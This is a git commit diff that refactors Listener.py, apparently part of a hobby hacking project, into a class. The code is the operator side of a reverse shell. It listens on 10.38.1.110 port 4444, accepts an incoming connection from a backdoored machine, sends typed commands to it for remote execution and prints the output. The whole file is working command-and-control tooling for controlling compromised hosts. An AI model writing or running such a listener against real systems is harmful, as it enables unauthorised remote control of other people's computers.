391d1a76efa9c6348cb1da9187e68fe73b302bc2
Raghav-45 <77260113+Raghav-45@users.noreply.github.com>
2022-08-26 23:19:28 +0530

    Made Our Code Neat by using Classes

--- Listener.py
+++ Listener.py
@@ -1,15 +1,26 @@
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(('10.38.1.110', 4444))
-listener.listen(0)
-print('[+] Waiting for incoming connections.')
-connection, address = listener.accept()
-print('[+] Got a connection from ' + str(address))
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # listener.bind(('10.38.1.110', 4444))
+        listener.bind((ip, port))
+        listener.listen(0)
+        print('[+] Waiting for incoming connections.')
+        self.connection, address = listener.accept()
+        print('[+] Got a connection from ' + str(address))
 
-while True:
-    command = input('>> ').encode()
-    connection.send(command)
-    result = connection.recv(1024).decode()
-    print(result)
+
+    def execute_remotely(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024).decode()
+    
+    def run(self):
+        while True:
+            command = input('>> ').encode()
+            result = self.execute_remotely(command)
+            print(result)
+            
+my_listener = Listener('10.38.1.110', 4444)
+my_listener.run()
